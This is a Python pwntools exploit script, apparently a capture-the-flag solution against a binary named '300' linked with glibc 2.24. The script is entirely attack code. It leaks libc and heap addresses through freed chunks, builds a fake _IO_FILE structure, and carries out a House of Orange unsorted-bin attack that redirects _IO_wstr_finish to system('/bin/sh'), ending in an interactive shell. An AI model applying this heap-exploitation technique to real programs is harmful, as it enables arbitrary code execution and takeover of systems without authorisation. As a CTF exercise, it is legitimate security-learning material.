#!/usr/bin/env python

from pwn import *

#context.log_level = 'debug'

io = process(['./300'], env={'LD_PRELOAD':'./libc-2.24.so'})
libc = ELF('libc-2.24.so')

def alloc(idx):
    io.sendlineafter("free\n", '1')
    io.sendlineafter("(0-9)\n", str(idx))

def write(idx, data):
    io.sendlineafter("free\n", '2')
    io.sendlineafter("(0-9)\n", str(idx))
    io.sendline(data)

def printt(idx):
    io.sendlineafter("free\n", '3')
    io.sendlineafter("(0-9)\n", str(idx))

def free(idx):
    io.sendlineafter("free\n", '4')
    io.sendlineafter("(0-9)\n", str(idx))

def leak():
    global libc_base
    global heap_addr

    alloc(0)
    alloc(1)
    alloc(2)
    alloc(3)
    alloc(4)

    free(1)
    free(3)

    printt(1)
    libc_base = u64(io.recvn(6).ljust(8, '\x00')) - 0x3c1b58
    printt(3)
    heap_addr = u64(io.recvn(6).ljust(8, '\x00')) - 0x310

    log.info("libc_base address: 0x%x" % libc_base)
    log.info("heap address: 0x%x" % heap_addr)

def house_of_orange():
    io_list_all = libc_base + libc.symbols['_IO_list_all']
    system_addr = libc_base + libc.symbols['system']
    bin_sh_addr = libc_base + libc.search('/bin/sh\x00').next()
    io_wstr_finish = libc_base + 0x3bdc90

    fake_chunk = heap_addr + 0x310 * 4 + 0x20
    fake_chunk_bk = heap_addr + 0x310 * 3

    log.info("_IO_list_all address: 0x%x" % io_list_all)
    log.info("system address: 0x%x" % system_addr)
    log.info("/bin/sh address: 0x%x" % bin_sh_addr)
    log.info("_IO_wstr_finish address: 0x%x" % io_wstr_finish)

    stream  = p64(0) + p64(0x61)                    # fake header       # fp
    stream += p64(0) + p64(fake_chunk_bk)           # fake bk pointer
    stream += p64(0)                                # fp->_IO_write_base
    stream += p64(0xffffffff)                       # fp->_IO_write_ptr 
    stream += p64(bin_sh_addr)                      # fp->_IO_write_end # fp->wide_data->buf_base
    stream  = stream.ljust(0x74, '\x00')
    stream += p64(0)                                # fp->_flags2
    stream  = stream.ljust(0xa0, '\x00')
    stream += p64(fake_chunk)                       # fp->_wide_data
    stream  = stream.ljust(0xc0, '\x00')
    stream += p64(0)                                # fp->_mode

    payload  = "A" * 0x10
    payload += stream
    payload += p64(0) * 2
    payload += p64(io_wstr_finish - 0x18)           # _IO_FILE_plus->vtable - 0x8
    payload += p64(0)
    payload += p64(system_addr)                     # ((_IO_strfile *) fp)->_s._free_buffer

    write(4, payload)

    payload  = p64(0) + p64(fake_chunk)             # unsorted_bin->TAIL->bk
    write(1, payload)

    alloc(5)
    alloc(6)                                        # put fake chunk in smallbins[5]

    free(5)                                         # put a chunk in unsorted bin
    write(5, p64(0) + p64(io_list_all - 0x10))      # bk pointer
    alloc(5)                                        # unsorted bin attack

def pwn():
    alloc(5)             # abort routine
    io.interactive()

if __name__ == '__main__':
    leak()
    house_of_orange()
    pwn()
